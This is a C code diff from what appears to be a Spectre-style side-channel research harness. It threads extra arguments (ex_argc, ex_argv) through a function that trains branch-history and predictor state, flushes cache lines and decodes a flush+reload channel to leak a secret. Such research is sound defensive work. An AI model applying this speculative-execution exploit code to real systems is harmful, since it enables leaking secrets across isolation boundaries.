@@ -114,12 +114,12 @@ static test_obj_t test_spec_bse = {
 };
 
 // TODO: rename this function
-void goto_chain(branch_chain_t br_chain, uint64_t *bh_targets, void **ib_ptr_p, int nr_cond_bh, void* frbuf, void* ptr_secret)
+void goto_chain(branch_chain_t br_chain, uint64_t *bh_targets, void **ib_ptr_p, int nr_cond_bh, void* frbuf, void* ptr_secret, uint64_t ex_argc, char **ex_argv)
 {
     // Populate BHB with conditional branches
     for (int i = 0; i < nr_cond_bh; i++) NOP(8);
     // Populate PHR with indirect branches and trains the BPU
-    br_chain(bh_targets, 0, NULL, ib_ptr_p, frbuf, ptr_secret);
+    br_chain(bh_targets, 0, ex_argv, ib_ptr_p, frbuf, ptr_secret);
 }
 
 // TODO: rename this function
@@ -172,7 +172,9 @@ void do_spectre_test(test_obj_t test_specs)
                 uint64_t nr_cond_bh = current->nr_cond_bh;
                 void *_frbuf = *(current->frbuf_p);
                 void *ptr_secret = current->ptr_secret;
-                goto_chain(bh_chain, bh_targets, ib_ptr_p, nr_cond_bh, _frbuf, ptr_secret);
+                uint64_t ex_argc = current->ex_argc;
+                char **ex_argv = current->ex_argv;
+                goto_chain(bh_chain, bh_targets, ib_ptr_p, nr_cond_bh, _frbuf, ptr_secret, ex_argc, ex_argv);
             }
         }
 
@@ -188,6 +190,8 @@ void do_spectre_test(test_obj_t test_specs)
         uint64_t nr_cond_bh = test->nr_cond_bh;
         char *_frbuf = *(test->frbuf_p);
         char *ptr_secret = test->ptr_secret;
+        uint64_t ex_argc = test->ex_argc;
+        char **ex_argv = test->ex_argv;
 
         FLUSH_DCACHE(ib_ptr_p);
         FLUSH_DCACHE(SC_ENCODE_ADDR(_frbuf, ptr_secret));
@@ -195,7 +199,7 @@ void do_spectre_test(test_obj_t test_specs)
             FLUSH_DCACHE(test_specs.dc_flush_p[i]);
         OPS_BARRIER(0x10);
     
-        goto_chain(bh_chain, bh_targets, ib_ptr_p, nr_cond_bh, _frbuf, ptr_secret);
+        goto_chain(bh_chain, bh_targets, ib_ptr_p, nr_cond_bh, _frbuf, ptr_secret, ex_argc, ex_argv);
         
         // Decode side channel to see if we have made it!
         OPS_BARRIER(0x10);
